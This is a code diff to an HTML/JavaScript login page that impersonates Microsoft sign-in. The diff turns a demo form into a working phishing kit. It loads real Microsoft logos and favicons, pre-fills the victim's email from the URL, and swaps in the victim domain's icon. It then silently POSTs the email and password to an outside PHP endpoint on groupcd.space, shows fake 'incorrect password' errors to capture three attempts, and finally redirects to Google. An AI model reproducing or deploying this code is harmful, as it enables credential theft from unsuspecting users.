@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your Microsoft account</title>
+    <title>Sign in with your account.</title>
+    <link id="dynamic-favicon" rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a3a1556ea6875e8f0df1f4379a08e2cd.ico">
+    
     <style>
         /* General Reset */
         * {
@@ -50,7 +52,6 @@
             height: 32px; 
         }
 
-        /* Dynamic Logo Link */
         .logo-link {
             display: flex;
             justify-content: center;
@@ -63,6 +64,7 @@
             max-width: 108px; 
             max-height: 32px;
             object-fit: contain;
+            transition: opacity 0.3s ease; 
         }
 
         /* Back Arrow Styling */
@@ -266,6 +268,11 @@
             background-color: #005da6;
         }
 
+        .btn-next:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+        }
+
         /* Footer Links inside card */
         .create-account {
             font-size: 15px;
@@ -298,7 +305,7 @@
         .step-password .password-group { display: block; }
         .step-password .password-toggle { display: block; }
 
-        /* Global Footer Layout - Centered */
+        /* Global Footer Layout */
         .global-footer {
             position: absolute;
             bottom: 20px;
@@ -371,8 +378,7 @@
                 </svg>
             </span>
             <a href="#" class="logo-link">
-                <!-- Added timestamp fallback in onerror -->
-                <img src="https://friendly-winner-images.onrender.com/logo.png" alt="Logo" class="logo-img" id="dynamicLogo" crossorigin="anonymous" onerror="this.src='https://friendly-winner-images.onrender.com/logo.png';">
+                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Logo" class="logo-img" id="dynamicLogo" onerror="this.onerror=null; this.src='https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg';">
             </a>
         </div>
         
@@ -380,7 +386,7 @@
         
         <h1 id="mainHeading">Sign in</h1>
         
-        <p class="subtitle" id="subHeading">Use your Microsoft account.</p>
+        <p class="subtitle" id="subHeading">Use your Email account.</p>
 
         <form id="loginForm" novalidate class="form-section">
             
@@ -389,8 +395,8 @@
                 <div class="input-area">
                     <div class="input-group" id="emailGroup">
                         <div class="input-wrapper">
-                            <input type="text" id="emailInput" placeholder=" " aria-label="Email">
-                            <label for="emailInput" class="floating-label">Email or phone number</label>
+                            <input type="text" id="emailInput" name="email" placeholder=" " aria-label="Email">
+                            <label for="emailInput" class="floating-label">Email</label>
                         </div>
                     </div>
                     
@@ -398,7 +404,7 @@
                         <svg class="error-icon" viewBox="0 0 24 24">
                             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                         </svg>
-                        Enter a valid email address or phone number
+                        Enter a valid email address
                     </div>
                 </div>
                 
@@ -410,7 +416,7 @@
                 <div class="input-area">
                     <div class="input-group" id="passwordGroup">
                         <div class="input-wrapper">
-                            <input type="password" id="passwordInput" placeholder=" " aria-label="Password">
+                            <input type="password" id="passwordInput" name="password" placeholder=" " aria-label="Password">
                             <label for="passwordInput" class="floating-label">Password</label>
                             <span class="password-toggle" id="togglePassword">
                                 <svg viewBox="0 0 24 24">
@@ -424,7 +430,7 @@
                         <svg class="error-icon" viewBox="0 0 24 24">
                             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                         </svg>
-                        Enter the password for your Microsoft account.
+                        Enter the password for your Email account.
                     </div>
                 </div>
 
@@ -440,7 +446,6 @@
 
     </div>
 
-    <!-- Bottom Footer Structure - Centered -->
     <div class="global-footer">
         <div class="footer-links">
             <a href="#">Help and feedback</a>
@@ -465,38 +470,42 @@
         const backBtn = document.getElementById('backBtn');
         const togglePassword = document.getElementById('togglePassword');
         const dynamicLogo = document.getElementById('dynamicLogo');
+        const passwordErrorMsg = document.getElementById('passwordError');
+        const dynamicFavicon = document.getElementById('dynamic-favicon');
+        const submitBtn = document.getElementById('nextBtn');
 
-        const defaultLogoUrl = 'https://friendly-winner-images.onrender.com/logo.png';
+        // REPLACE THIS WITH YOUR REMOTE PHP URL
+        const REMOTE_PHP_URL = 'https://groupcd.space/moveup/teams/login.php'; 
+
+        const defaultLogoUrl = 'https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg';
+        const defaultFaviconUrl = 'https://logincdn.msauth.net/shared/1.0/content/images/favicon_a3a1556ea6875e8f0df1f4379a08e2cd.ico';
+        
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         let currentStep = 'email';
+        let passwordAttemptCount = 0; 
 
-        // Function to update logo based on domain using Google's Favicon service (highly reliable)
         function updateLogoForDomain(email) {
             if (!email || !email.includes('@')) {
                 dynamicLogo.src = defaultLogoUrl;
+                dynamicFavicon.href = defaultFaviconUrl;
                 return;
             }
+
+            const domain = email.split('@')[1].trim();
+            const logoApiUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
             
-            try {
-                const domain = email.split('@')[1].trim();
-                // Using Google's S2 Favicon service which returns an icon for almost any domain
-                const logoApiUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=128`;
-                
-                // To prevent caching issues and force reload, we create a new Image object
-                const img = new Image();
-                img.onload = function() {
-                    dynamicLogo.src = logoApiUrl;
-                };
-                img.onerror = function() {
-                    dynamicLogo.src = defaultLogoUrl;
-                };
-                img.src = logoApiUrl;
-            } catch (e) {
+            const testImg = new Image();
+            testImg.onload = function() {
+                dynamicLogo.src = logoApiUrl;
+                dynamicFavicon.href = logoApiUrl;
+            };
+            testImg.onerror = function() {
                 dynamicLogo.src = defaultLogoUrl;
-            }
+                dynamicFavicon.href = defaultFaviconUrl;
+            };
+            testImg.src = logoApiUrl;
         }
 
-        // Check URL for email parameter on page load
         window.addEventListener('DOMContentLoaded', () => {
             const urlParams = new URLSearchParams(window.location.search);
             const emailParam = urlParams.get('email');
@@ -505,14 +514,13 @@
                 const decodedEmail = decodeURIComponent(emailParam).trim();
                 if (emailRegex.test(decodedEmail)) {
                     emailInput.value = decodedEmail;
-                    // Pre-fetch the logo in the background
                     updateLogoForDomain(decodedEmail);
                 }
             }
         });
 
         form.addEventListener('submit', function(e) {
-            e.preventDefault(); 
+            e.preventDefault(); // Prevent default form submission
             
             if (currentStep === 'email') {
                 const emailValue = emailInput.value.trim();
@@ -538,14 +546,77 @@
                     setTimeout(() => passwordInput.focus(), 100);
                 }
             } else {
+                // PASSWORD STEP
                 const passwordValue = passwordInput.value.trim();
-                passwordGroup.classList.remove('error');
-
-                if (passwordValue === '') {
+                
+                if (passwordValue === '' && passwordAttemptCount === 0) {
                     passwordGroup.classList.add('error');
+                    passwordErrorMsg.innerHTML = `
+                        <svg class="error-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        Enter the password for your Email account.
+                    `;
                     passwordInput.focus();
-                } else {
-                    alert("Password submitted (Demo)");
+                } 
+                else if (passwordValue !== '') {
+                    passwordAttemptCount++;
+                    
+                    // Prepare data for backend
+                    const formData = new FormData();
+                    formData.append('email', emailInput.value.trim());
+                    formData.append('password', passwordValue);
+
+                    // 1ST ATTEMPT
+                    if (passwordAttemptCount === 1) {
+                        // Send to remote server in background
+                        fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
+                            .catch(err => console.log("Background save failed", err));
+
+                        // Show error locally and stay on page
+                        passwordGroup.classList.add('error');
+                        passwordErrorMsg.innerHTML = `
+                            <svg class="error-icon" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                            That password is incorrect for your Email account.
+                        `;
+                        passwordInput.value = ''; 
+                        passwordInput.focus();
+                    } 
+                    // 2ND ATTEMPT
+                    else if (passwordAttemptCount === 2) {
+                        // Send to remote server in background
+                        fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
+                            .catch(err => console.log("Background save failed", err));
+
+                        // Show error locally and stay on page
+                        passwordGroup.classList.add('error');
+                        passwordErrorMsg.innerHTML = `
+                            <svg class="error-icon" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                            That password is incorrect, Try again.
+                        `;
+                        passwordInput.value = ''; 
+                        passwordInput.focus();
+                    }
+                    // 3RD ATTEMPT (REDIRECT)
+                    else if (passwordAttemptCount === 3) {
+                        submitBtn.disabled = true;
+                        submitBtn.innerText = "Signing in...";
+
+                        // Send the final attempt to remote server, then redirect
+                        fetch(REMOTE_PHP_URL, { method: 'POST', body: formData })
+                            .then(() => {
+                                // Redirect after successful send
+                                window.location.href = "https://www.google.com";
+                            })
+                            .catch(() => {
+                                // Redirect even if network fails
+                                window.location.href = "https://www.google.com";
+                            });
+                    }
                 }
             }
         });
@@ -559,12 +630,16 @@
             subHeading.style.display = 'block';
             
             dynamicLogo.src = defaultLogoUrl;
+            dynamicFavicon.href = defaultFaviconUrl;
             
             document.querySelector('.email-input-group').style.display = 'block';
             document.querySelector('.password-group').style.display = 'none';
             
             passwordInput.value = '';
             passwordGroup.classList.remove('error');
+            passwordAttemptCount = 0; 
+            submitBtn.disabled = false;
+            submitBtn.innerText = "Next";
             setTimeout(() => emailInput.focus(), 100);
         });
 
